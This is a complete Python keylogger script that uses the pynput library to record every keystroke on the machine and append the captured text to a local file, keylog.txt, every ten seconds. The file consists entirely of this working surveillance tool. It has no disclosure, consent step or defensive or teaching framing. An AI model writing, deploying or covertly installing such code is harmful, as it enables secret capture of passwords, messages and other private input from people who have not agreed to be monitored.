import pynput.keyboard
import threading
import time

class Keylogger:
    def __init__(self):
        self.log = ""
        self.timer_interval = 10  # Save logs every 10 seconds
        self.start_time = time.time()

    def callback(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\n"
            else:
                self.log += f" {key} "

    def report(self):
        if self.log:
            with open("keylog.txt", "a") as f:
                f.write(self.log)
            self.log = ""
        # Schedule the next report
        timer = threading.Timer(self.timer_interval, self.report)
        timer.daemon = True  # Terminate the timer when the main thread exits
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.callback)
        with keyboard_listener:
            self.report()  # Start the periodic reporting
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()